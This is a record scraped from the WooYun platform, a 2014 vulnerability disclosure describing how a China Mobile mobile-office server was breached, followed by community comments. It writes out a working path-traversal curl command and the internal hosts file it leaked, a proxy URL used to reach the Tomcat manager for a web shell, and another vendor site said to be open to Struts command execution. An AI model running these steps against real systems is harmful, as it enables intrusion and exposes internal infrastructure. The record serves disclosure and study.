{"id": 47785, "wybug_id": "wooyun-2014-085441", "wybug_title": "中移动某内部核心业务文件读取及延伸（内网边界突破技巧）", "wybug_corp": "中国移动&某系统厂商", "wybug_author": "s0mun5", "wybug_date": "2014-12-01 15:23", "wybug_open_date": "2015-01-15 15:24", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向公众公开  简要描述： 中移动某内部核心业务文件读取到奇葩方式getshell最后延伸到某商业系统 详细说明：  https://moa.10086.cn中国移动移动办公系统。\n\n存在任意文件读取\ncurl https://moa.10086.cn/../../../../../../../../../etc/hosts -k127.0.0.1\ttailorcmcc1\tlocalhost.localdomain\tlocalhost::1\ttailorcmcc1\tlocalhost6.localdomain6\tlocalhost6#127.0.1.1\ttailorcmcc1# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersff02::3 ip6-allhosts10.1.48.57   emis.hq.cmcc10.1.48.9    cmccbpm1.hq.cmcc10.1.28.21   oa.hq.cmcc10.2.7.85    efinance.hq.cmcc10.1.48.25   cmccbpm3.hq.cmcc10.1.48.48   iscbpm.hq.cmcc10.1.48.167  cmccapp4.hq.cmcc10.1.48.165  hqtydb.hq.cmcc hqtyyb.hq.cmcc10.1.48.151  hqmail.hq.cmcc10.1.48.170  cmccapp5.hq.cmcc10.1.48.164  cmccsm.hq.cmcc10.1.52.250  uum.hq.cmcc10.1.48.166\tcmccapp3.hq.cmcc10.1.48.58\tapp1.hq.cmcc10.1.48.34\tcmccbpm4.hq.cmcc10.1.48.24\tcmccbpm2.hq.cmcc10.1.48.15\tnewsonline.hq.cmcc10.1.48.23\tresource.hq.cmcc#172.16.20.51 mail.chinamobile.com172.16.121.101 mail.chinamobile.com\n后来发现所有的数据都是通过一个叫tailor的二级目录代理进内网做的，猜测这是一个代理服务。\n\n   漏洞证明：  然后访问https://moa.10086.cn/tailor/http://localhost:8080访问tomcat成功，利用文件读取读到tomcat密码\n\n由于测试发现这个代理不能带401的验证头，在url中写入 访问后台成功https://moa.10086.cn/tailor/http://admin:passwords@localhost:8080/manager/html然后部署war包，getshell。\n\n出于好奇研究后发现tailor就是一个代理服务，并且可以转码web——》wap然后找到了这套系统的厂商http://www.h3w.com.cn/。\nTailor是什么？       Tailor是北京掌中经纬技术有限公司潜心数年研究开发的移动化中间件产品。该产品技术已向国家产权局申请了相关专利并已受理。Tailor能干什么？       Tailor顾名思义是一个裁缝，它可以根据用户要求，对各种Web应用进行裁剪、设计、缝制形成一个新的应用，并且Tailor技术是天然移动化的。Tailor关键技术：       1. Web应用的拆分与重装技术通过该项技术，可根据业务需要将各类Web应用在应用层完成应用拆解与重组装，并且无需原应用提供接口。       2. JavaScript执行过程的动态控制可将Web应用前台主要业务逻辑控制脚本（JavaScript）执行过程进行动态控制，包括中断、切分、再执行等。       通过此两项关键技术，不但可完成某单一简单或复杂应用移动化，并可进行多应用服务融合，甚至对整个服务流程进行切片、重组、优化。目前该两项技术均已申请相关专利\n\n\n成功案例不少，找一个测试一个问题的通用性。https://m.scmcc.com.cn/\n\n\n\n这家厂商问题还是不少的 比如http://www.wosoo.net:8880/CQLXEPM/sysmanage/login.action\n\newp系统 存在struts命令执行，进入内网拿到客户列表应该能突破一些比如没找到地址的百度~   修复方案：     版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-12-05 17:12 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向中国移动通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-01 15:26 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  下一个会是联通？    \n     2014-12-01 15:29 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  文件读取到内网漫游么    \n     2014-12-01 15:29 |    \t\t白非白 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:60        | ♫ Freedom - Anthony Hamilton ♫)\t\t \n  系统厂商？redhat？    \n     2014-12-01 15:34 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  叼叼叼  小V还差多少核心?    \n     2014-12-01 15:35 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这是要破纪录的节奏哇    \n     2014-12-01 15:35 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-12-01 15:39 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  V587    \n     2014-12-01 15:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  又闪电了！我为什么要说又？    \n     2014-12-01 15:47 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @px1624 闪电什么时候这么容易了....    \n     2014-12-01 15:49 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @子非海绵宝宝 小V本来不就是核心么    \n     2014-12-01 15:57 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  文件读取很常见，但是没有姿势shell，这个要学习一下    \n     2014-12-01 16:13 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @子非海绵宝宝 能闪电肯定很牛逼，关注坐等可以看    \n     2014-12-01 16:30 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  求获取闪电小窍门啊!~    \n     2014-12-01 16:31 |    \t\tcf_hb \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:17        | 爱生活，爱安全！)\t\t \n  期待ing    \n     2014-12-01 16:34 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @子非海绵宝宝 你上一个闪电就是敲门    \n     2014-12-01 16:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  牛逼啊 只发精华漏洞    \n     2014-12-01 16:59 |    \t\t邓先生 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 其实，打你就像划小船)\t\t \n  好期待    \n     2014-12-01 17:26 |    \t\t狼狗 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 我来到这里是为了国家各个互联网安全。学习...)\t\t \n  不错不错。好给力的技术、    \n     2014-12-01 18:13 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  突破边界，socks？    \n     2014-12-01 21:54 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  关注    \n     2014-12-01 22:12 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  坐等小v核心    \n     2014-12-01 22:39 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  这是一个神奇的漏洞    \n     2014-12-02 13:08 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  Mark    \n     2014-12-26 09:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  通用？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}